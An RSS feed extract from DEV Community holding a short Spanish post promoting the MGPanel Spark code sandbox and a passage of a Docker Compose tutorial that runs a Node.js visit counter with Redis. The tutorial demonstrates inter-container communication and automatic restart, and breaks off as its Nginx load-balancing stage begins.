<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Prueba tus códigos html, css y javascript con MGPanel en spark</title>
      <author>Eloy Manuel Chacón Martínez</author>
      <pubDate>Fri, 24 Dec 2021 21:35:24 +0000</pubDate>
      <link>https://dev.to/eloymanuelch/prueba-tus-codigos-html-css-y-javascript-con-mgpanel-en-spark-1000</link>
      <guid>https://dev.to/eloymanuelch/prueba-tus-codigos-html-css-y-javascript-con-mgpanel-en-spark-1000</guid>
      <description>&lt;p&gt;Holaa programador, ya sea que estes comenzando en el mundo de la programación web o que ya tengas tiempo siempre vamos a necesitar un lugar donde probar nuestros códigos de una forma fácil, segura y a demás gratis.&lt;/p&gt;

&lt;p&gt;MGPanel tiene una herramienta gratuita para programadores que se llama &lt;strong&gt;Spark&lt;/strong&gt;, con el podrás probar tus html, css y javascript todo en tiempo real, a demás podrás guardarlos para tenerlos de referencia cuando estes programando algún proyecto real.&lt;/p&gt;

&lt;p&gt;Para usar la herramienta ingresa a: &lt;a href="https://app.mgpanel.org/spark"&gt;https://app.mgpanel.org/spark&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wlRBGuVT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kkl931ty1o2r00ez94g3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wlRBGuVT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kkl931ty1o2r00ez94g3.png" alt="Image description" width="880" height="470"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;No tienes necesidad de registrarte a menos que quieras guardar tus sparks.  Espero te pueda ayudar en tus proyectos, tanto como me ayuda en los míos.&lt;/p&gt;

</description>
      <category>mgpanel</category>
      <category>javascript</category>
      <category>html</category>
      <category>css</category>
    </item>
    <item>
      <title>Node.js and Redis deployed in Docker containers, using Docker Compose - then load-balancing the Node.js servers with Nginx</title>
      <author>marcelkatz</author>
      <pubDate>Fri, 24 Dec 2021 21:35:16 +0000</pubDate>
      <link>https://dev.to/marcelkatz/nodejs-and-redis-deployed-in-docker-containers-using-docker-compose-then-load-balancing-the-nodejs-servers-with-nginx-4omc</link>
      <guid>https://dev.to/marcelkatz/nodejs-and-redis-deployed-in-docker-containers-using-docker-compose-then-load-balancing-the-nodejs-servers-with-nginx-4omc</guid>
      <description>&lt;p&gt;This article contains two main stages:&lt;br&gt;
&lt;strong&gt;(1) Containerizing a Node.js server application and a Redis database instance into two separate Docker containers, using Dockerfile and Docker Compose, and showing how these two applications communicate with each other.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(2) Load-balancing the Node.js server, using a containerized Nginx reverse-proxy.&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Let’s start with Stage 1:&lt;br&gt;
(1) Containerizing a Node.js server application and a Redis instance into two separate Docker containers, using Dockerfile and Docker Compose, and showing how these two applications communicate with each other&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting with a simple &lt;strong&gt;Node.js server&lt;/strong&gt; application (we’ll call it “&lt;em&gt;test-webapp&lt;/em&gt;”) that responds to an &lt;em&gt;HTTP GET&lt;/em&gt; request by displaying the “numbers of visits”. The numbering scheme below (i.e. (1.1), (1.2), (1.3) etc.), matches the numbering in the diagram below:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vjd6PFTp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3yp6moj945jli4n6vfl4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vjd6PFTp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3yp6moj945jli4n6vfl4.png" alt="Figure 1.a – Schematic diagram of the components" width="624" height="350"&gt;&lt;/a&gt;&lt;br&gt;
&lt;em&gt;Figure 1.a - Schematic diagram of the components&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In "&lt;strong&gt;Figure 1.a - Schematic diagram of the components&lt;/strong&gt;" above we have the following components:&lt;br&gt;
(&lt;strong&gt;1.1&lt;/strong&gt;) "&lt;em&gt;Docker Container 1&lt;/em&gt;" - container running the &lt;strong&gt;Node.js server&lt;/strong&gt; called "&lt;em&gt;test-webapp&lt;/em&gt;" that communicates with the browser on the left. Each time we refresh the URL &lt;code&gt;localhost:80&lt;/code&gt; i.e. we send a &lt;code&gt;GET&lt;/code&gt;command to the &lt;strong&gt;Node.js server&lt;/strong&gt; "&lt;em&gt;test-webapp&lt;/em&gt;", the server code increments the number of visits, then saves this value into the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database instance that runs on "&lt;em&gt;Docker Container 2&lt;/em&gt;", and also displays the value back in the browser.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.2&lt;/strong&gt;) “&lt;em&gt;Dockerfile&lt;/em&gt;” - defines and controls the &lt;strong&gt;Node.js server&lt;/strong&gt; process in “&lt;em&gt;Docker Container 1&lt;/em&gt;”. &lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.3&lt;/strong&gt;, &lt;strong&gt;1.3.1&lt;/strong&gt;, &lt;strong&gt;1.3.2&lt;/strong&gt;) “&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/docker-compose.yml"&gt;docker-compose.yml&lt;/a&gt;&lt;/em&gt;” – the &lt;strong&gt;Docker Compose&lt;/strong&gt; config file defines and controls both “&lt;em&gt;Docker Container 1&lt;/em&gt;” and “&lt;em&gt;Docker Container 2&lt;/em&gt;”. “&lt;em&gt;Docker Container 1&lt;/em&gt;” runs the &lt;strong&gt;Node.js server&lt;/strong&gt; process “&lt;em&gt;test-webap_p”. “_Docker Container 2&lt;/em&gt;” runs the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database instance.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.3.3&lt;/strong&gt;) &lt;strong&gt;Docker Compose&lt;/strong&gt; establishes by default a communication network between “&lt;em&gt;Docker Container 1&lt;/em&gt;” and “&lt;em&gt;Docker Container 2&lt;/em&gt;” which allow the &lt;strong&gt;Node.js server&lt;/strong&gt; process “&lt;em&gt;test-webapp&lt;/em&gt;” to communicate with the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database instance, and exchange between them the “number of visits to the app/web server” (&lt;code&gt;numVisits&lt;/code&gt;) value.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.3.4&lt;/strong&gt;) &lt;strong&gt;Docker Compose&lt;/strong&gt; maps local hosting machine Port 80 to “&lt;em&gt;Docker Container 1&lt;/em&gt;” Port 5000. Port 5000 is the port on which the &lt;strong&gt;Node.js server&lt;/strong&gt; “&lt;em&gt;test-webapp&lt;/em&gt;” listens and reacts to the &lt;code&gt;GET&lt;/code&gt;commands sent by the browser.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.4&lt;/strong&gt;) Connecting to the shell of “&lt;em&gt;Docker Container 2&lt;/em&gt;” and then to the client command line of the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database instance via “&lt;code&gt;redis-cli&lt;/code&gt;” we can see that the value of &lt;code&gt;numVisits&lt;/code&gt; (which represents the number of times the browser issued a &lt;code&gt;GET&lt;/code&gt;command to the &lt;strong&gt;Node.js server&lt;/strong&gt;) is in sync with the value displayed in the browser by the &lt;strong&gt;Node.js server&lt;/strong&gt; – thus showing that inter-process communication occurs between the processes “&lt;em&gt;test-webapp&lt;/em&gt;” in “&lt;em&gt;Docker Container 1&lt;/em&gt;” and the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; process in “&lt;em&gt;Docker Container 2&lt;/em&gt;”.&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.5&lt;/strong&gt;) This step illustrates the &lt;code&gt;restart&lt;/code&gt; directive and capability in &lt;strong&gt;Docker Compose&lt;/strong&gt; (specified in config file “&lt;em&gt;docker-compose.yml&lt;/em&gt;”) – when connecting to the Linux shell of “&lt;em&gt;Docker Container 1&lt;/em&gt;”, we can &lt;code&gt;kill -9&lt;/code&gt; the &lt;strong&gt;Node.js server&lt;/strong&gt; process, but the &lt;strong&gt;Node.js server&lt;/strong&gt; process will be restarted automatically by &lt;strong&gt;Docker Compose&lt;/strong&gt; – illustrating the automatic recovery provided by &lt;strong&gt;Docker Compose&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;And now let’s describe the steps and the flow of this scenario. The numbering scheme in the description below (i.e. (1.1), (1.2), (1.3) etc.), matches the numbering in “&lt;strong&gt;Figure 1.a – Schematic diagram of the components&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1.1) File structure:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_yC5myBq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rm92ysovtnnq9azlunop.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_yC5myBq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rm92ysovtnnq9azlunop.png" alt="Figure 1.b – File structure for Stage 1" width="864" height="688"&gt;&lt;/a&gt;&lt;br&gt;
&lt;em&gt;Figure 1.b – File structure for Stage 1&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Node.js files for process ‘test-webapp’:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The contents of directory “&lt;em&gt;test-webapp&lt;/em&gt;”, where the source code for the &lt;strong&gt;Node.js server&lt;/strong&gt; “&lt;em&gt;test-webapp&lt;/em&gt;” resides:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bSempo81--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jqed4cw6m1mpm1upws9m.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bSempo81--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jqed4cw6m1mpm1upws9m.png" alt="Node.js files for process 'test-webapp'" width="165" height="164"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.2&lt;/strong&gt;) The &lt;em&gt;Dockerfile _containerizes and controls the &lt;strong&gt;Node.js application&lt;/strong&gt; by downloading the “_node:alpine&lt;/em&gt;” image from &lt;a href="https://hub.docker.com/"&gt;Docker Hub&lt;/a&gt;, installing &lt;strong&gt;Node.js&lt;/strong&gt; on the container, copying to the container the &lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/tree/main/test-webapp"&gt;source files&lt;/a&gt; – then launching the &lt;strong&gt;Node.js server&lt;/strong&gt; web app (see source code in file “&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/test-webapp/server.js"&gt;&lt;em&gt;server.js&lt;/em&gt;&lt;/a&gt;”).&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.3&lt;/strong&gt;) Going one directory above, we see the "&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/docker-compose.yml"&gt;docker-compose.yml&lt;/a&gt;&lt;/em&gt;" file that organizes the containerization and sets up the architecture of all the components. (File &lt;br&gt;
“&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/docker-compose-nginx.yml"&gt;docker-composer-nginx.yml&lt;/a&gt;&lt;/em&gt;” will be presented and explained in &lt;strong&gt;Stage 2&lt;/strong&gt; of this article)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--naPa4IgZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tqtlkv6v7vams8x3xq9d.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--naPa4IgZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tqtlkv6v7vams8x3xq9d.png" alt="'docker-compose.yml' file for process 'test-webapp'" width="312" height="88"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Purge all images and containers:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We run command &lt;code&gt;docker system prune -a&lt;/code&gt; to clear all Docker images and containers and start with a clean slate.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;**docker system prune -a**                                          
WARNING! This will remove:                                                                                                
- all stopped containers                                                                                                
- all networks not used by at least one container                                                                       
- all images without at least one container associated to them                                                          
- all build cache                                                                                                                                                                                                                             
Are you sure you want to continue? [y/N] **y**
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;(1.3) Build and run the 'test-webapp' image with Docker Compose&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Use command &lt;code&gt;docker-compose -f &amp;lt;config-filename&amp;gt; build&lt;/code&gt; to build containers and the applications that will be running in each container:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;docker-compose -f docker-compose.yml build&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;See the results below of the built Docker image:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;C:\test-docker\test-redis&amp;gt;**docker images**                                                                                                                      
REPOSITORY               TAG       IMAGE ID       CREATED         SIZE                                                                                                                     
**test-redis_test-webapp**   latest    e8145bea0fec   4 minutes ago   175MB
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Run the 'test-webapp' and 'redis' containers with 'docker-compose':&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let’s launch both “&lt;em&gt;test-webapp&lt;/em&gt;” and “&lt;em&gt;redis&lt;/em&gt;” services, as described in config file &lt;br&gt;
“&lt;em&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/docker-compose.yml"&gt;docker-compose.yml&lt;/a&gt;&lt;/em&gt;”, using the &lt;code&gt;docker-compose -f &amp;lt;config-filename&amp;gt; up&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7d3NTR5i--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/66ukw6kmm4djhk2nzxsa.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7d3NTR5i--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/66ukw6kmm4djhk2nzxsa.PNG" alt="docker-compose -f docker-compose.yml up" width="634" height="233"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can see from the output above, that both the “&lt;em&gt;redis&lt;/em&gt;” container (“&lt;em&gt;test-redis_1&lt;/em&gt;” – corresponding to “&lt;em&gt;Docker Container 2&lt;/em&gt;” in &lt;strong&gt;Figure 1.a&lt;/strong&gt;) and the “&lt;em&gt;test-webapp&lt;/em&gt;” container (“&lt;em&gt;test-webapp_1&lt;/em&gt;” corresponding to “&lt;em&gt;Docker Container 1&lt;/em&gt;” in &lt;strong&gt;Figure 1.a&lt;/strong&gt;) are running and printing to stdout in the command line window where we launched &lt;strong&gt;Docker Compose&lt;/strong&gt; to run these two containers.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;View the 'test-webapp' and 'redis' running containers:&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;C:\test-docker\test-redis\test-webapp&amp;gt;**docker ps**                                                                                          
CONTAINER ID   IMAGE                    PORTS                
NAMES                                         
_928b8b07415d   _test-redis_test-webapp   0.0.0.0:80-&amp;gt;5000/tcp   test-redis_test-webapp_1                      
_a8756127bff5   _redis:alpine             6379/tcp               test-redis_test-redis_1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;(&lt;strong&gt;1.3.1&lt;/strong&gt;, &lt;strong&gt;1.3.2&lt;/strong&gt;) The two containers above match the containers “&lt;em&gt;Docker Container 1&lt;/em&gt;” and “&lt;em&gt;Docker Container 2&lt;/em&gt;” in the &lt;strong&gt;Figure 1.a&lt;/strong&gt; above. Note the “&lt;em&gt;CONTAINER ID&lt;/em&gt;” column whose values we will use below to perform operation on each individual running container. &lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.3.4&lt;/strong&gt;) Port 5000 in the &lt;strong&gt;Node.js server&lt;/strong&gt; "&lt;em&gt;test-webapp&lt;/em&gt;" container is mapped to local (hosting) Port 80, so when one connects in the local (hosting) browser to URL &lt;strong&gt;&lt;a href="http://localhost:80"&gt;http://localhost:80&lt;/a&gt;&lt;/strong&gt;, for each refresh, the &lt;strong&gt;Node.js process&lt;/strong&gt; in the “&lt;em&gt;test-webapp&lt;/em&gt;” container increments the number of visits in variable &lt;code&gt;numVisits&lt;/code&gt; which is set and saved in the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; in variable &lt;code&gt;numVisits&lt;/code&gt; -- and this value is also send back and displayed in the browser. &lt;/p&gt;

&lt;p&gt;“Docker-compose” sets-up by default a network with both “&lt;em&gt;test-webapp&lt;/em&gt;” container (“&lt;em&gt;Docker Container 1&lt;/em&gt;” in &lt;strong&gt;Figure 1.a&lt;/strong&gt;) and “&lt;em&gt;redis&lt;/em&gt;” container (“&lt;em&gt;Docker Container 2&lt;/em&gt;” in &lt;strong&gt;Figure 1.a&lt;/strong&gt;) within this network, and both containers are reachable by each other via this network. &lt;/p&gt;

&lt;p&gt;The local browser communicates with the &lt;strong&gt;Node.js server&lt;/strong&gt; container. When refreshing the connection in the browser, the server callback is invoked which responds to the browser with the updated number of visits.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--BKBbVg8w--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/euscx0msi6am2kz9tk7j.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--BKBbVg8w--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/euscx0msi6am2kz9tk7j.png" alt="1.3.4 Browser - localhost - number of visits 8" width="419" height="170"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.4&lt;/strong&gt;) We are using the &lt;code&gt;docker exec -it&lt;/code&gt; command that allows us to connect to a running container while the &lt;code&gt;-it&lt;/code&gt; option allows us to capture the stdin/stdout of that container. Then we specify the CONTAINER ID &lt;em&gt;a8756127bff5&lt;/em&gt; obtained from &lt;code&gt;docker ps&lt;/code&gt; command above, followed by the shell (&lt;strong&gt;&lt;em&gt;sh&lt;/em&gt;&lt;/strong&gt;) that we want to launch as we enter the container. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yg3tBOGU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9h8w6ozk1nloy29lygpv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--yg3tBOGU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9h8w6ozk1nloy29lygpv.png" alt="docker exec -it a8756127bff5 sh" width="780" height="74"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;C:\test-redis\test-webapp&amp;gt;**docker exec -it** _a8756127bff5_ **sh**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then, once we are inside the container’s shell, we connect to the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database using the &lt;code&gt;redis-cli&lt;/code&gt; command. At the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; prompt we use &lt;code&gt;get numVisits&lt;/code&gt; to obtain the value of the variable “&lt;strong&gt;numVisits&lt;/strong&gt;” inside “&lt;em&gt;redis&lt;/em&gt;”. We can see that the “&lt;em&gt;redis&lt;/em&gt;” instance communicates with the “&lt;em&gt;test-webapp&lt;/em&gt;” process in its respective container and the variable “&lt;em&gt;numVisits&lt;/em&gt;” in the &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; database instance is in sync with its value in the browser. In this case both have the value “&lt;strong&gt;8&lt;/strong&gt;”, because we refreshed 8 times the “&lt;strong&gt;localhost:80&lt;/strong&gt;” URL thus issuing a &lt;code&gt;GET&lt;/code&gt; command in the browser that is intercepted by the *&lt;em&gt;Node.js server *&lt;/em&gt; which increments the “number of visits” (&lt;code&gt;numVisits&lt;/code&gt;) variable. The “number of visits” value is sent back to the browser by the “&lt;em&gt;test-webapp&lt;/em&gt;” process which also saves the value in the “&lt;em&gt;redis&lt;/em&gt;” database in variable &lt;code&gt;numVisits&lt;/code&gt;).&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/data # **redis-cli**                                                                                                                                                      
127.0.0.1:6379&amp;gt; **get numVisits  **                                                                                                                                        
"**8**"                                                                                                                                                                    
127.0.0.1:6379&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;From within the “&lt;em&gt;redis-cli&lt;/em&gt;” in the “&lt;em&gt;redis&lt;/em&gt;” container (“&lt;em&gt;Docker Container 2&lt;/em&gt;”) we can also set in &lt;strong&gt;&lt;em&gt;Redis&lt;/em&gt;&lt;/strong&gt; manually the “&lt;em&gt;numVisits&lt;/em&gt;” variable to a random value of let’s say “&lt;strong&gt;342&lt;/strong&gt;”…&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5mFZNh5z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3snsztp8x4gcgco7t7ec.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5mFZNh5z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3snsztp8x4gcgco7t7ec.png" alt="1.4 - redis - set num visits 342" width="407" height="91"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;…the &lt;code&gt;numVisits&lt;/code&gt; variable is updated in the “test-webapp” &lt;strong&gt;Node.js server&lt;/strong&gt; (running in “&lt;em&gt;Docker Container 1&lt;/em&gt;”), and therefore in the browser (due to the fact that in order to invoke the &lt;em&gt;callback&lt;/em&gt; in the &lt;strong&gt;&lt;a href="https://github.com/marcelkatz/test-docker-nodejs-redis-nginx/blob/main/test-webapp/server.js"&gt;Node.js server&lt;/a&gt;&lt;/strong&gt;, one needs to refresh the connection to “&lt;strong&gt;localhost:80&lt;/strong&gt;”, the number of visits increases by &lt;strong&gt;1&lt;/strong&gt;, thus &lt;strong&gt;342&lt;/strong&gt; + 1 = &lt;strong&gt;343&lt;/strong&gt;. This shows that we have two-way inter-process communications between the processes running in “&lt;em&gt;Docker Container 1&lt;/em&gt;” and “&lt;em&gt;Docker Container 2&lt;/em&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FNra9-r7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oapryvdzrnppyzztuxfn.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FNra9-r7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/oapryvdzrnppyzztuxfn.png" alt="1.4 Browser - localhost - number of visits 343" width="435" height="191"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;1.5&lt;/strong&gt;) A useful feature provided by &lt;strong&gt;Docker Compose&lt;/strong&gt; is the capability to specify in “&lt;em&gt;docker-compose.yml&lt;/em&gt;” a “&lt;a href="https://docs.docker.com/config/containers/start-containers-automatically/#use-a-restart-policy"&gt;restart&lt;/a&gt;” option. &lt;br&gt;
This will allow us when connecting to the shell of “&lt;em&gt;Docker Container 1&lt;/em&gt;”, to “kill” the &lt;strong&gt;Node.js server&lt;/strong&gt; process, but the &lt;strong&gt;Node.js server&lt;/strong&gt; process will be restarted automatically by the &lt;strong&gt;Docker Compose&lt;/strong&gt; “&lt;em&gt;restart&lt;/em&gt;” directive.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;C: \test-docker\test-redis\test-webapp&amp;gt;**docker ps**                                                                                          CONTAINER ID   IMAGE                    PORTS                  NAMES                                         
**_928b8b07415d   _**test-redis_test-webapp   0.0.0.0:80-&amp;gt;5000/tcp   test-redis_test-webapp_1                      
a8756127bff5   redis:alpine             6379/tcp               test-redis_test-redis_1 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Connect to the Docker container whose ID is &lt;em&gt;928b8b07415d&lt;/em&gt; and invoke the shell (&lt;strong&gt;&lt;em&gt;sh&lt;/em&gt;&lt;/strong&gt;). &lt;/p&gt;

&lt;p&gt;&lt;code&gt;C:\test-redis\test-webapp&amp;gt;**docker exec -it** 928b8b07415d **sh**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Inside the container, at the shell prompt, show all process id’s using &lt;code&gt;ps -al&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/usr/src/app # **ps -al**                                                                                                                                                  PID   USER     TIME  COMMAND                                                                                                                                               1     root     0:00  npm start                                                                                                                                            **19**    root     0:00  node server.js                                                                                                                                       30    root     0:00  sh                                                                                                                                                   36    root     0:00  ps -al 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Proceed with “killing” the “&lt;em&gt;node server.js&lt;/em&gt;” process by issuing a &lt;code&gt;kill -9 &amp;lt;process-id&amp;gt;&lt;/code&gt; command:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/usr/src/app # **kill -9** 19&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In the command line window that is running &lt;strong&gt;Docker Compose&lt;/strong&gt; we can see how the “&lt;em&gt;test-webapp&lt;/em&gt;” receives a “kill signal” (&lt;code&gt;SIGKILL&lt;/code&gt;), exited with code ‘&lt;strong&gt;1&lt;/strong&gt;’, and then restarted automatically.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--PyOXsmV8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7m25v5kmnu9zlbobgqgf.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--PyOXsmV8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7m25v5kmnu9zlbobgqgf.PNG" alt="npm ERR command sh -c node server.js" width="604" height="136"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;Stage 1&lt;/strong&gt; of this example we showed how &lt;strong&gt;Docker Compose&lt;/strong&gt; allows us to easily establish independent environments that communicate with each other, and also the automatic fault-tolerance (restart on failure) capability of Docker Compose.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Let’s continue with Stage 2:&lt;br&gt;
